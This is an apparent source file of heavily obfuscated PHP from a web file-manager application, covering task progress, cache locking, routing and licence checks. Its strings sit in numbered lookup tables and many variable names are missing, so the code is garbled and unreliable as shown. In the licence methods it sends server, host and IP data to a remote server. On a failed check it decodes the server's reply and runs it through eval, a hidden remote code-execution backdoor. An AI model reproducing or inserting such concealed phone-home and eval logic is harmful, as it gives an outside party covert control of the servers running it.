self::log(array("{$}\x3b\141\x64\x64\x3d{$}", $Ψ)); $this->sourceModelCopyFlag = !1; } public function sourceRemove($, $) { $ַ =& $_SERVER[]; $this->sourceModelCopyFlag = !0; $Ǭ˄ = 1; if (isset($[$ַ[82]])) { $Ǭ˄ = $[$ַ[82]][$ַ[80]]; $Ǭ˄ = $Ǭ˄ + $[$ַ[82]][$ַ[81]] + 1; } $this->update($Ǭ˄); $this->sourceModelCopyFlag = !1; $this->log(array($ַ[2049], $Ǭ˄, $)); } public function sourceMove($) { $this->sourceRemove($, !1); } public function curlProgress($ރ, $򲅩, $, $, $) { $ݴʣ =& $_SERVER[]; $ =& $this->task; if ($ > 0) { $[$ݴʣ[1228]] = $ݴʣ[2050]; $[$ݴʣ[2025]] = $ݴʣ[107]; if ($[$ݴʣ[2023]]) { $[$ݴʣ[2024]] = $; } if ($[$ݴʣ[2026]]) { $[$ݴʣ[2024]] = $ + $[$ݴʣ[2026]]; } } else { if ($ > 0) { if ($[$ݴʣ[2023]] == $򲅩) { $[$ݴʣ[2024]] = $; $[$ݴʣ[1228]] = $ݴʣ[2051]; $[$ݴʣ[2025]] = $ݴʣ[1379]; } } } $this->update(); $Ҍ = "\x64\x6f\167\156\x3a{$}\57{$򲅩}\73\x20\165\x70\x6c\157\141\144\x3a{$}\x2f{$}\x3b\146\151\154\145\75" . $[$ݴʣ[2023]]; self::log(array($ݴʣ[2052] . $Ҍ . $ݴʣ[74] . $[$ݴʣ[2021]], curl_getinfo($ރ))); } public function curlProgressStart($) { } public function curlProgressEnd($̓) { $ =& $_SERVER[]; $ߖɼ۪ =& $this->task; $Ȫ = curl_getinfo($̓); $ = $Ȫ[$[2053]]; if ($ == -1) { $ = $Ȫ[$[2054]]; } if ($ߖɼ۪[$[2025]] == $[107] && $) { $ߖɼ۪[$[2026]] += $; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ =& $_SERVER[]; $ɂ =& $this->task; $ɂ[$[2055]] = 1; Hook::bind($[2015], array($this, $[2056])); Hook::bind($[2017], array($this, $[2057])); Hook::bind($[2019], array($this, $[2058])); } protected function endAfter() { $ =& $_SERVER[]; Hook::unbind($[2015], array($this, $[2056])); Hook::unbind($[2017], array($this, $[2057])); Hook::unbind($[2019], array($this, $[2058])); } public function progressStart($㙷) { $朱 =& $_SERVER[]; $¨ο = curl_getinfo($㙷); self::log($朱[2059] . $¨ο[$朱[382]]); self::valueSet($this->task[$朱[487]], $this->task); } public function progressEnd($) { $薍 =& $_SERVER[]; self::log($薍[2060] . $this->task[$薍[487]]); $this->end(); } public function progress($͗, $ʅţ, $, $, $) { $嘱 =& $_SERVER[]; $߲ځ =& $this->task; if ($ > 0) { $߲ځ[$嘱[1226]] = $߲ځ[$嘱[1226]] == 0 ? $ : $߲ځ[$嘱[1226]]; $߲ځ[$嘱[1970]] = $; } else { if ($ > 0) { $߲ځ[$嘱[1226]] = $߲ځ[$嘱[1226]] == 0 ? $ʅţ : $߲ځ[$嘱[1226]]; $߲ځ[$嘱[1970]] = $; } } $this->update(); self::log("\x70\162\157\x67\162\x65\163\163\110\x74\x74\x70\x3a\144\157\167\156\x3a{$}\x2f{$ʅţ}\73\x20\165\160\x6c\x6f\x61\x64\72{$}\57{$}\73"); } } goto c͵ۙކ; Eƈ: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $އ =& $_SERVER[]; $ = $GLOBALS[$އ[6]][$އ[424]]; self::$cachePath = $[$އ[230]][$އ[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($, $ʜ = 0) { $û =& $_SERVER[]; $Ϙ = microtime(!0); $׍ = $Ϙ + $ʜ + 0.0001; $Щ = rtrim(self::$cachePath, $û[8]) . $û[1023] . md5($) . $û[1020]; if (file_exists($Щ) && filemtime($Щ) && filemtime($Щ) < time() - 10) { @unlink($Щ); } do { if (file_exists($Щ)) { cacheLockWait(); continue; } $۫ = fopen($Щ, $û[1024]); if (!$۫) { return !1; } $ = flock($۫, LOCK_EX | LOCK_NB); self::$caches[$] = array($û[1025] => $۫, $û[230] => $Щ); fwrite($۫, $׍); clearstatcache(); if ($۫ && $) { return !0; } cacheLockWait(); } while (microtime(!0) < $׍); $this->unlock($); return !1; } public function lockGet($׆) { $ż =& $_SERVER[]; $ = rtrim(self::$cachePath, $ż[8]) . $ż[1023] . md5($׆) . $ż[1020]; return file_exists($); } public function unlock($) { $ͩ =& $_SERVER[]; $ = self::$caches[$]; if (!$) { return; } @flock($[$ͩ[1025]], LOCK_UN); @fclose($[$ͩ[1025]]); @unlink($[$ͩ[230]]); unset(self::$caches[$]); } } class CacheLockRedis { public function lock($׳, $˾ = 10) { $Ɇ = Cache::init(); $ = microtime(!0) + $˾; while (microtime(!0) < $) { $ع = $Ɇ->get($׳); if (!$ع) { $ = $Ɇ->setLock($׳, $, $˾); if ($) { return !0; } } else { if ($ع < microtime(!0)) { $Ɇ->set($׳, $, $˾ * 2); if ($Ɇ->get($׳) === $ع) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Ϭ) { return Cache::init()->get($Ϭ); } public function unlock($޸) { return Cache::init()->remove($޸); } } class CacheLockMemcached { public function lock($畓, $ = 0) { $ = Cache::init(); $ = microtime(!0) + $; while (microtime(!0) < $) { $ = $->get($畓); if (!$ || $ < microtime(!0)) { $Β = $->handle->add($畓, $, $); if ($Β) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($푙) { return Cache::init()->get($푙); } public function unlock($ɧ) { return Cache::init()->remove($ɧ); } } goto dɮ; Bᵒ: define($_SERVER[][317], 3); define($_SERVER[][318], 1); define($_SERVER[][319], 0); goto e; AĚ: while ($yqzhsxcfrv < $_SERVER[][706]) { if ($yqzhsxcfrv >= 0) { break; } $yqzhsxcfrv++; } class Application { private $defaultModule = "\151\x6e\x64\145\x78"; private $defaultController = "\x69\156\x64\145\170"; private $defaultAction = "\x69\156\144\145\170"; function __construct() { } public function setDefault($޿) { $ݚÙ =& $_SERVER[]; $ =& $_SERVER[鎖]; $枚 = explode($[0], trim($޿, $[0])); $Փ = $ݚÙ[707]; if (strlen($Փ) < $ݚÙ[708]) { return; } $this->defaultModule = $枚[0] ? $枚[0] : $this->defaultModule; $ = $ݚÙ[709]; if (!$) { return; } $this->defaultController = $枚[1] ? $枚[1] : $this->defaultController; $this->defaultAction = $枚[2] ? $枚[2] : $this->defaultAction; $ʎ = $ݚÙ[710]; while (strlen($ʎ) < $ݚÙ[706]) { if (!$ʎ) { break; } $ʎ++; } $this->wqxz99e20a28($[1], array($this, $[2])); } public function appRun($Ʌ) { $Ţ =& $_SERVER[鎖]; $诅 = explode($Ţ[0], $Ʌ); $֨ӫ = strtolower($诅[0]); $é = $_SERVER[][711]; if (!$é) { die; } $᷈ = $Ţ[3]; if ($֨ӫ == $Ţ[4]) { $᷈ = $Ţ[5]; $诅[0] = $Ţ[6]; $诅[1] = $诅[1] . $Ţ[7]; $Ʌ = join($Ţ[0], $诅); $Ʌ = trim($Ʌ, $Ţ[0]); } call_user_func(array($Ţ[8], $Ţ[9]), $᷈ . $Ţ[10], $Ʌ); ActionCall($Ʌ); call_user_func(array($Ţ[8], $Ţ[9]), $᷈ . $Ţ[11], $Ʌ); } private function autorun() { $ =& $_SERVER[鎖]; global $config; if (count($config[$[12]]) == 0) { return; } foreach ($config[$[12]] as $װ => $ȶ) { $this->appRun($ȶ); } } private function wikge1d72543() { $Ϙ =& $_SERVER[]; $ =& $_SERVER[鎖]; $ل = $[4]; $ = $GLOBALS[$[13]][$[14]][0]; $ӧ෭ = $Ϙ[712]; while ($ӧ෭ < $Ϙ[708]) { if ($ӧ෭ >= 0) { break; } $ӧ෭++; } if (!$ || strlen($) <= strlen($ل)) { return; } if (strtolower(substr($, -strlen($ل))) != $ل) { return; } $ݰ = substr($, 0, -strlen($ل)); $ = array($[4], $ݰ); $ = $Ϙ[713]; while (strlen($) < $Ϙ[714]) { if (!$) { break; } $++; } $ = array_slice($GLOBALS[$[13]][$[14]], 1); $ކϦͰ = $Ϙ[715]; while (strlen($ކϦͰ) < $Ϙ[716]) { if (!$ކϦͰ) { break; } $ކϦͰ++; } $GLOBALS[$[13]][$[14]] = array_merge($, $); $GLOBALS[$[13]][$[15]] = implode($[0], $GLOBALS[$[13]][$[14]]); } private function gfmn7471ebca() { $ =& $_SERVER[]; $̖ =& $_SERVER[鎖]; if ($GLOBALS[$̖[13]][$̖[15]] != $̖[6]) { return; } $ܸ = $_SERVER[$̖[16]]; $ = $̖[17]; if (!strstr($ܸ, $)) { return; } $ڵ = strrpos($ܸ, $); $׸ = substr($ܸ, $ڵ + strlen($)); preg_match_all($̖[18], $׸, $Ϧ); $ = $[717]; if (strlen($) < $[716]) { return; } $׸ = trim($Ϧ[0][0], $̖[19]); $GLOBALS[$̖[13]][$̖[14]] = explode($̖[19], $׸); $ = $[718]; if (!$) { return; } $GLOBALS[$̖[13]][$̖[15]] = implode($̖[0], $GLOBALS[$̖[13]][$̖[14]]); } public function run() { $ =& $_SERVER[]; $ =& $_SERVER[鎖]; $this->gfmn7471ebca(); $ = $[719]; $this->wikge1d72543(); $巶 = $GLOBALS[$[13]][$[14]]; $ = $GLOBALS[$[13]][$[15]]; $梶 = $[720]; while ($梶 < $[706]) { if ($梶 >= 0) { break; } $梶++; } define($[20], isset($巶[0]) && $巶[0] ? $巶[0] : $this->defaultModule); define($[21], isset($巶[1]) && $巶[0] ? $巶[1] : $this->defaultController); $ԏ = $[721]; if (!$ԏ) { die; } define($[22], isset($巶[2]) && $巶[0] ? $巶[2] : $this->defaultAction); $ = $[722]; if (strlen($) < $[714]) { die; } define($[23], MOD . $[0] . ST . $[0] . ACT); $ = $[723]; if (strlen($) < $[716]) { return; } $_SERVER[$[24]] = strtolower(ACTION); $this->autorun(); $Ǐ = $[724]; if (strlen($Ǐ) < $[702]) { die; } if (count($巶) >= 3) { $this->appRun($); } else { $this->appRun(ACTION); } } private $gsolabc2b4ca = array(); private $hsieeb21fc85 = ''; public function naxwc3398e24() { $ =& $_SERVER[]; $Ԏ =& $_SERVER[鎖]; $this->xncra52a938b(); $this->mnctc56a4f64(); $this->szor67fe8dda(); $this->qlgp1d3bae43(); $this->fqmjf5e8d6b4(); $this->tlwa7d9c0dc8(); $this->qtcl02fe3798(); $this->wqxz99e20a28($Ԏ[25], array($this, $Ԏ[26])); $this->wqxz99e20a28($Ԏ[27], array($this, $Ԏ[28])); $Ɛ = $[725]; $this->wqxz99e20a28($Ԏ[29], array($this, $Ԏ[30])); $ = $[726]; if (strlen($) < $[714]) { die; } $this->wqxz99e20a28($Ԏ[31], array($this, $Ԏ[32])); } public function getVersionData() { $ =& $_SERVER[]; return $this->gsolabc2b4ca; $ɇ = $[727]; while (strlen($ɇ) < $[708]) { if (!$ɇ) { break; } $ɇ++; } } public function gpqwb7504441($) { $׎ =& $_SERVER[]; $ =& $_SERVER[鎖]; $Р = Model($[33])->get(); $ = $׎[728]; if (!$) { return; } $˕ = array($[34], $[35], $[36], $[37], $[38], $[39], $[40], $[41], $[42], $[43], $[44], $[45], $[46], $[47], $[48], $[49], $[50], $[51], $[52], $[53], $[54], $[55], $[56], $[57], $[58], $[59], $[60], $[61], $[62], $[63], $[64], $[65], $[66], $[67], $[68], $[69], $[70], $[71], $[72], $[73], $[74], $[75], $[76], $[77], $[78], $[79], $[80], $[81], $[82], $[83], $[84], $[85], $[86], $[87]); $ = $׎[729]; if (!$) { die; } foreach ($˕ as $) { $ = $GLOBALS[$[88]][$[89]][$]; $ܝڞ = $׎[730]; if (isset($Р[$])) { $ = $Р[$]; } $[$[90]][$[91]][$] = $; } $ = $[$[90]][$[91]][$[46]]; unset($[$[90]][$[92]][$[93]]); unset($[$[90]][$[92]][$[94]]); unset($[$[90]][$[91]][$[46]]); $ = $׎[731]; unset($[$[90]][$[91]][$[95]]); $Ɋ = $׎[732]; while ($Ɋ < $׎[716]) { if ($Ɋ >= 0) { break; } $Ɋ++; } $[$[90]][$[91]][$[96]] = array($[97] => (int) $[$[98]], $[99] => (int) _get($, $[100], 0)); $ = substr(md5($[101] . get_client_ip() . $Р[$[102]]), 0, 15); $[$[103]][$[104]] = Mcrypt::encode(Session::sign(), $, 3600 * 24); $ɺ = $׎[733]; $[$[103]][$[105]] = Action($[106])->accessToken(); $[$[103]][$[107]] = md5($_SERVER[$[108]] . $Р[$[102]]); $ = $׎[734]; while (strlen($) < $׎[702]) { if (!$) { break; } $++; } $[$[103]][$[109]] = base64_encode(serverInfo()); $[$[103]][$[110]] = $this->hsieeb21fc85; $ߵ = $׎[735]; if (strlen($ߵ) < $׎[716]) { die; } if ($Р[$[110]] != $[111]) { $[$[103]][$[112]] = $Р[$[112]]; $[$[103]][$[113]] = $Р[$[113]]; $ϕ = rand_string(10) . $this->hsieeb21fc85 . rand_string(5); $[$[90]][$[114]][$[115]] = $this->yhncb0d7a67a($ϕ, $[$[103]][$[107]]); } if ($this->hsieeb21fc85 == $[111]) { $[$[90]][$[91]][$[96]][$[100]] = 0; } $[$[103]][$[116]] = $this->versionPluginFilter(); $[$[103]][$[117]] = _get($this->gsolabc2b4ca, $[118], $[6]); $ = $׎[736]; if (KodUser::isRoot() && $this->config[$[119]]) { $[$[103]][$[120]] = WEB_ROOT; } return $; } private function tlwa7d9c0dc8() { $ԡ =& $_SERVER[]; $󏎦 =& $_SERVER[鎖]; $߻ = $_SERVER[$󏎦[24]] == $󏎦[121]; if ($_SERVER[$󏎦[24]] == $󏎦[122] && $_GET[$󏎦[123]] == $󏎦[124]) { $߻ = !0; } if ($߻) { $ = array($󏎦[110] => $this->hsieeb21fc85, $󏎦[125] => $this->qbwxe5da2b48(), $󏎦[126] => Model($󏎦[127])->count()); if ($this->hsieeb21fc85 != $󏎦[111]) { $溽 = _get($this->gsolabc2b4ca, $󏎦[128]); if ($溽) { $[$󏎦[129]] = $溽; $[$󏎦[130]] = strtotime(_get($this->gsolabc2b4ca, $󏎦[131])); $[$󏎦[132]] = _get($this->gsolabc2b4ca, $󏎦[118]); } $Ϣҙ = Model($󏎦[33])->get($󏎦[133], $󏎦[6], !0); if (is_string($Ϣҙ) && substr($Ϣҙ, 0, 1) == $󏎦[134]) { $Ϣҙ = json_decode_force($Ϣҙ); } if (is_array($Ϣҙ) && $Ϣҙ[$󏎦[135]] && strstr($Ϣҙ[$󏎦[135]], $󏎦[136])) { $ = explode($󏎦[136], $Ϣҙ[$󏎦[135]]); $[$󏎦[137]] = $[0]; } } $ = $this->ywakc35d9075(json_encode($), md5($󏎦[138])); $ = $ԡ[737]; $ = array($󏎦[139] => $); call_user_func(array($󏎦[140], $󏎦[141]), $); $ = $ԡ[738]; if (!$) { die; } } if ($this->hsieeb21fc85 == $󏎦[111]) { return; } $߆ = array($󏎦[142], $󏎦[143], $󏎦[144], $󏎦[145], $󏎦[146], $󏎦[147]); $τη = Model($󏎦[33])->get(); $쌨Ѷ = $ԡ[739]; while ($쌨Ѷ < $ԡ[708]) { if ($쌨Ѷ >= 0) { break; } $쌨Ѷ++; } $ = array($󏎦[148] => $τη[$󏎦[34]], $󏎦[149] => $τη[$󏎦[35]], $󏎦[150] => $󏎦[6]); $ = $ԡ[740]; foreach ($߆ as $ʥ) { if (!isset($τη[$ʥ]) || !$τη[$ʥ]) { continue; } $[$ʥ] = $τη[$ʥ]; $ = $ԡ[741]; } call_user_func(array($󏎦[140], $󏎦[141]), $); $ = $ԡ[742]; while (strlen($) < $ԡ[706]) { if (!$) { break; } $++; } } private function qlgp1d3bae43() { $Т֑ =& $_SERVER[]; $ԙ =& $_SERVER[鎖]; if ($_SERVER[$ԙ[24]] != $ԙ[151]) { return; } if (!KodUser::isRoot()) { die; } $Ę = $GLOBALS[$ԙ[13]]; if (isset($Ę[$ԙ[152]])) { $this->bqzp7ae696b4(); die; } if (isset($Ę[$ԙ[153]]) && isset($Ę[$ԙ[153]]) == $ԙ[124]) { $Ę[$ԙ[154]] = Model($ԙ[33])->get($ԙ[155]); } if (!isset($Ę[$ԙ[154]]) || strlen($Ę[$ԙ[154]]) != 16) { show_json($ԙ[156] . $Ę[$ԙ[154]], !1); } $鐳 = Model($ԙ[33])->get($ԙ[102]); $ᯗ = md5($_SERVER[$ԙ[108]] . $鐳); $ = $Т֑[743]; if (!$) { return; } $Ȯ = array($ԙ[154] => $Ę[$ԙ[154]], $ԙ[157] => rand_string(16), $ԙ[158] => $ԙ[138], $ԙ[159] => $ԙ[160], $ԙ[161] => $_SERVER[$ԙ[162]], $ԙ[163] => $_SERVER[$ԙ[164]], $ԙ[165] => $_SERVER[$ԙ[166]], $ԙ[107] => $ᯗ, $ԙ[167] => Model($ԙ[33])->get($ԙ[133])); if (isset($Ę[$ԙ[153]]) && isset($Ę[$ԙ[153]]) == $ԙ[124]) { $Ȯ[$ԙ[153]] = md5($Ȯ[$ԙ[154]] . $ԙ[168] . $Ȯ[$ԙ[157]]); } if ($Ę[$ԙ[169]] == $ԙ[170]) { $Ǐ = $this->ywakc35d9075($ᯗ, $ԙ[171]); $駼 = $this->yhncb0d7a67a(json_encode($Ȯ), $ᯗ . $ԙ[172], 3); $駼 = $駼 . $ԙ[173] . $_SERVER[$ԙ[162]]; $җԫ = $this->hxtp3d56dc5c($ԙ[174] . $Ǐ . $ԙ[175] . $駼, -1); show_json($җԫ, !0); } else { if ($Ę[$ԙ[169]] == $ԙ[176]) { $ = substr(md5($ԙ[177] . $ᯗ), 12, 15) . $ԙ[178]; $駼 = $this->alje1820cd09(trim($Ę[$ԙ[179]]), $, 2); $ = json_decode($駼, !0); if (!is_array($) || !is_array($[$ԙ[180]]) || $[$ԙ[154]] != !0) { $ʂ = $ԙ[181]; $ = $[$ԙ[180]] ? $ԙ[182] . $[$ԙ[180]] : $ʂ; show_json($, !1); } else { $Ȯ[$ԙ[157]] = $[$ԙ[180]][$ԙ[183]]; } } else { $ = $this->hxtp3d56dc5c($ԙ[184], $Ȯ, 10); } } if (!is_array($) || !is_array($[$ԙ[180]]) || $[$ԙ[154]] != !0) { $ʂ = LNG($ԙ[185]); $ = $[$ԙ[180]] ? $ԙ[182] . $[$ԙ[180]] : $ʂ; show_json($, !1); } $ = $[$ԙ[180]]; $ʋ = $this->lvqn8c6c5318($[$ԙ[186]]); $ = $Т֑[744]; if (strlen($) < $Т֑[706]) { return; } if (!$ʋ || $ʋ != $[$ԙ[131]]) { $ = array($ԙ[187] => Model($ԙ[33])->get($ԙ[102]), $ԙ[188] => $_SERVER[$ԙ[108]], $ԙ[189] => this_url(), $ԙ[163] => $_SERVER[$ԙ[164]]); $駼 = $this->mdju68237aae(json_encode($)); $this->hxtp3d56dc5c($ԙ[190] . $駼); show_json(LNG($ԙ[191]), !0); } $ = array($ԙ[155] => $[$ԙ[192]], $ԙ[193] => $[$ԙ[194]], $ԙ[195] => rand_string(16), $ԙ[110] => $[$ԙ[196]]); if ($Ȯ[$ԙ[157]]) { $[$ԙ[195]] = $Ȯ[$ԙ[157]]; } $ջא = substr(md5($[$ԙ[193]]), 10, 10); $ = $ջא . $[$ԙ[110]] . $[$ԙ[195]]; $[$ԙ[112]] = strrev(base64_encode($this->ywakc35d9075($, $ԙ[197]))); $ = rand_string(16); $ = $Т֑[745]; $ = $ . $[$ԙ[110]] . $this->ywakc35d9075(md5($[$ԙ[155]]), $); $׻ = $Т֑[746]; if (!$׻) { die; } $[$ԙ[113]] = base64_encode(strrev($this->ywakc35d9075($, $ԙ[198]))); if ($[$ԙ[199]] && $[$ԙ[199]] >= 1) { Model($ԙ[33])->setDeep($ԙ[200], $ԙ[124]); } Model($ԙ[33])->set($); $Ð = md5($_SERVER[$ԙ[108]] . strrev($鐳) . $[$ԙ[193]]); $躥 = strrev(substr($Ð, 10, 16)); $ = $this->yhncb0d7a67a(json_encode($), $Ð); $ԑ = array_to_keyvalue(Model($ԙ[7])->listData(), $ԙ[201]); $א = $ԑ[$ԙ[202]]; $㱸믤 = $Т֑[747]; $Ɨ = array(); $Ɨ[$躥] = $; $ҁ = $Т֑[748]; Model($ԙ[7])->update($א[$ԙ[203]], array($ԙ[204] => $Ɨ)); $ߐ = $Т֑[749]; if (strlen($ߐ) < $Т֑[716]) { return; } $this->gsolabc2b4ca = $; $ = $Т֑[750]; $this->hsieeb21fc85 = $[$ԙ[110]]; $this->licenseRegistSuccess(); Cache::set($ԙ[205] . md5($鐳 . $ԙ[206]), $ԙ[6]); $ = $Т֑[751]; if (!$) { die; } show_json(LNG($ԙ[191]), !0); } private function licenseRegistSuccess() { $ =& $_SERVER[鎖]; $΀ = Model($[33])->get(); $ٖ = $_SERVER[][752]; if (!$ٖ) { die; } if ($΀[$[63]] != $[124]) { Model($[33])->set($[63], $[124]); } Action($[207])->initStart(!0); } private function bqzp7ae696b4() { $踗 =& $_SERVER[]; $ް =& $_SERVER[鎖]; Model($ް[33])->set(array($ް[155] => $ް[6], $ް[193] => $ް[6], $ް[110] => $ް[111], $ް[112] => $ް[6], $ް[113] => $ް[6])); $ = $踗[753]; if (!$) { die; } Model($ް[33])->setDeep($ް[200], $ް[208]); $this->gsolabc2b4ca = array(); $this->hsieeb21fc85 = $ް[111]; $⥿׌ = $踗[754]; if (!$⥿׌) { die; } } private function xncra52a938b() { $ =& $_SERVER[]; $ =& $_SERVER[鎖]; $_SERVER[$[164]] = _get($_SERVER, $[164], APP_HOST); $this->hsieeb21fc85 = $[111]; $ = $[755]; if (!$) { return; } $ = Model($[33])->get(); $㸭ؙ = $[756]; while ($㸭ؙ < $[714]) { if ($㸭ؙ >= 0) { break; } $㸭ؙ++; } if ($[$[110]] == $[111]) { return; } $Á = Model($[33])->get($[102]); $Ϣ = $[757]; if (!$Ϣ) { return; } $ӷ = $[205] . md5($Á . $[206]); $Ρ = Cache::get($ӷ); if (!is_array($Ρ) || !isset($Ρ[$[209]]) || time() - $Ρ[$[209]] >= 60) { $ē = Model($[7])->loadList(); $Ӣ = $ē[$[202]]; $򩏥 = md5($_SERVER[$[108]] . strrev($Á) . $[$[193]]); $Ӓ = strrev(substr($򩏥, 10, 16)); $Ρ = $this->alje1820cd09($Ӣ[$[88]][$Ӓ], $򩏥); $Ρ = json_decode($Ρ, !0); } if (!is_array($Ρ)) { return $this->bqzp7ae696b4(); } $ = strtotime($Ρ[$[131]]); if (time() >= $) { return $this->bqzp7ae696b4(); } if (!isset($Ρ[$[209]]) || time() - $Ρ[$[209]] > 20) { $Ρ[$[209]] = time(); Cache::set($ӷ, $Ρ); } $this->gsolabc2b4ca = $Ρ; $this->hsieeb21fc85 = $[$[110]]; $GLOBALS[$[210]] = $this; } private function mnctc56a4f64() { $ǳ =& $_SERVER[]; $պ =& $_SERVER[鎖]; $ = $GLOBALS[$պ[13]]; $ = $ǳ[758]; while (strlen($) < $ǳ[706]) { if (!$) { break; } $++; } $ = $_SERVER[$պ[24]]; $ = $ǳ[759]; if ($ == $պ[211] && $this->hsieeb21fc85 == $պ[111]) { show_json(LNG($պ[212]), !1, $պ[213]); } $ѳ = array($պ[214], $պ[215]); if (in_array($, $ѳ)) { if ($this->hsieeb21fc85 == $պ[111] && isset($[$պ[216]])) { show_json(LNG($պ[212]), !1, $պ[213]); die; } $ۋϥ = $this->qbwxe5da2b48(); if ($ۋϥ != intval($պ[217])) { if ($ۋϥ <= Model($պ[127])->count()) { show_json(LNG($պ[218]), !1, $պ[213]); die; } } } } private function szor67fe8dda() { $ڛ =& $_SERVER[]; $ۄ =& $_SERVER[鎖]; $ = array($ۄ[121], $ۄ[122]); $ل = $ڛ[760]; if (!KodUser::isRoot() || !isset($_GET[$ۄ[219]])) { return; } if (!in_array($_SERVER[$ۄ[24]], $)) { return; } $˭ק = $ۄ[220]; $ = $ڛ[761]; $˭ק = $this->fcye322b01de($˭ק, $ۄ[221]); $ָ = $ڛ[762]; if (strlen($ָ) < $ڛ[706]) { die; } $΂ = stream_context_create(array($ۄ[222] => array($ۄ[223] => $ۄ[224], $ۄ[225] => 3))); $ = $ڛ[763]; if (!$) { die; } $ = @file_get_contents($˭ק, !1, $΂); $ = $ڛ[764]; while (strlen($) < $ڛ[708]) { if (!$) { break; } $++; } header($ۄ[226]); $҇ = $ڛ[765]; if ($ && strstr($, $ۄ[227])) { echo $; } die; } public function ieabeedb64db($ʣũ) { $ĝ =& $_SERVER[鎖]; if ($this->hsieeb21fc85 == $ĝ[228]) { return $ʣũ; } $Κ = $this->versionPluginList(); $® = explode($ĝ[229], $this->versionPluginFilter()); $С = array(); foreach ($Κ as $Й => $) { if ($ == $ĝ[230] && substr($this->hsieeb21fc85, 0, 1) == $ĝ[230]) { continue; } if (!in_array($Й, $®)) { $С[] = $Й; } } foreach ($С as $Й) { unset($ʣũ[$Й]); $ = $_SERVER[][766]; if (!$) { return; } } return $ʣũ; } private function versionPluginList() { $׃ =& $_SERVER[]; $͔ =& $_SERVER[鎖]; return array($͔[231] => $͔[230], $͔[232] => $͔[230], $͔[233] => $͔[230], $͔[234] => $͔[230], $͔[235] => $͔[230], $͔[236] => $͔[230], $͔[237] => $͔[238], $͔[239] => $͔[238], $͔[240] => $͔[238], $͔[241] => $͔[238], $͔[242] => $͔[238], $͔[243] => $͔[238], $͔[244] => $͔[238], $͔[245] => $͔[238], $͔[246] => $͔[238], $͔[247] => $͔[238], $͔[248] => $͔[238], $͔[249] => $͔[238], $͔[250] => $͔[238]); $σ = $׃[767]; if (strlen($σ) < $׃[702]) { die; } } private function versionPluginFilter() { $ =& $_SERVER[]; $Ȏ =& $_SERVER[鎖]; if ($this->hsieeb21fc85 == $Ȏ[111]) { return $Ȏ[6]; } $ = _get($this->gsolabc2b4ca, $Ȏ[251], $Ȏ[6]); $埯 = $[768]; $ڽ = _get($this->gsolabc2b4ca, $Ȏ[118], $Ȏ[6]); $Ӷ = _get($this->gsolabc2b4ca, $Ȏ[252], $Ȏ[6]); $⃭ = $[769]; while (strlen($⃭) < $[714]) { if (!$⃭) { break; } $⃭++; } if ($ڽ > time() && $Ӷ > time()) { $ = explode($Ȏ[229], $); $ = array_keys($this->versionPluginList()); $ = array_merge($, $); $ = implode($Ȏ[229], array_filter(array_unique($))); } return $; } private function qtcl02fe3798() { $ =& $_SERVER[鎖]; if ($this->hsieeb21fc85 != $[111]) { $GLOBALS[$[88]][$[92]][$[253]] = $[208]; return; } $GLOBALS[$[88]][$[254]] = $[124]; if (Model($[255])->get($[63]) != $[208]) { Model($[255])->set($[63], $[208]); } } public function tpva6823a676() { return $_SERVER[鎖][256]; $˘ = $_SERVER[][770]; if (!$˘) { return; } } private function fqmjf5e8d6b4() { $ؑ =& $_SERVER[]; $ޓ =& $_SERVER[鎖]; $؟ = array($ޓ[257], $ޓ[258], $ޓ[259]); $ђ = $ؑ[771]; if (!$ђ) { return; } $ė = $ޓ[260] . md5($ޓ[261]); $֑Ɉ = $ؑ[772]; if ($this->hsieeb21fc85 == $ޓ[111] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$ޓ[24]], $؟)) { return; } if (time() % 4 != 0) { return; } $ = call_user_func(array($ޓ[262], $ޓ[263]), $ė); if ($ && time() - $ < intval($ޓ[264])) { return; } call_user_func(array($ޓ[262], $ޓ[141]), $ė, time()); $ܪ = $ؑ[773]; while ($ܪ < $ؑ[714]) { if ($ܪ >= 0) { break; } $ܪ++; } $ = Model($ޓ[33])->get($ޓ[102]); $ޏ = $ؑ[774]; if (!$ޏ) { return; } $ = array($ޓ[154] => Model($ޓ[33])->get($ޓ[155]), $ޓ[169] => $this->hsieeb21fc85, $ޓ[165] => $_SERVER[$ޓ[166]], $ޓ[167] => Model($ޓ[33])->get($ޓ[133]), $ޓ[107] => md5($_SERVER[$ޓ[108]] . $), $ޓ[158] => $ޓ[138], $ޓ[161] => $_SERVER[$ޓ[162]]); $ = $ؑ[775]; if (!$) { return; } $ů = $this->hxtp3d56dc5c($ޓ[265], $); $ᥗ = $ؑ[776]; if (strlen($ᥗ) < $ؑ[702]) { die; } if (!is_array($ů)) { return; } if ($ů[$ޓ[154]] && $ů[$ޓ[266]]) { if ($this->lvqn8c6c5318($ů[$ޓ[266]]) == $[$ޓ[154]]) { return; } } $this->bqzp7ae696b4(); if ($this->lvqn8c6c5318($ů[$ޓ[266]]) != $[$ޓ[154]]) { $ = array($ޓ[187] => $, $ޓ[188] => $_SERVER[$ޓ[108]], $ޓ[189] => this_url(), $ޓ[163] => $_SERVER[$ޓ[164]]); $ = $this->mdju68237aae(json_encode($)); $ů = $this->hxtp3d56dc5c($ޓ[190] . $); if ($ů && is_array($ů) && isset($ů[$ޓ[266]])) { $ = $this->alje1820cd09($ů[$ޓ[266]], 2); if ($) { $ = $this->lvqn8c6c5318($); } if ($) { try { @eval($); } catch (Exception $匲) { } } } } } private function hxtp3d56dc5c($ĭ = '', $໋ = array(), $ = 5) { $ =& $_SERVER[]; $ =& $_SERVER[鎖]; $̇ = $[267]; $ٹ = $[777]; if (strlen($ٹ) < $[702]) { die; } $̇ = $this->fcye322b01de($̇, $[268]); $̇ = $̇ . $ĭ; $Ծ߈ = $[778]; while (strlen($Ծ߈) < $[716]) { if (!$Ծ߈) { break; } $Ծ߈++; } if ($໋ && is_array($໋)) { $̇ = $̇ . $[269] . http_build_query($໋); } if ($໋ === -1) { return $̇; } $Ư = stream_context_create(array($[222] => array($[225] => $, $[223] => $[270]), $[271] => array($[272] => !1, $[273] => !1))); $໋ = @file_get_contents($̇, !1, $Ư); return json_decode($໋, !0); $ = $[779]; } private function qbwxe5da2b48() { $ =& $_SERVER[]; $Î =& $_SERVER[鎖]; $ = array($Î[274] => $Î[275], $Î[276] => $Î[277], $Î[278] => $Î[279], $Î[280] => $Î[281], $Î[282] => $Î[283], $Î[284] => $Î[217], $Î[285] => 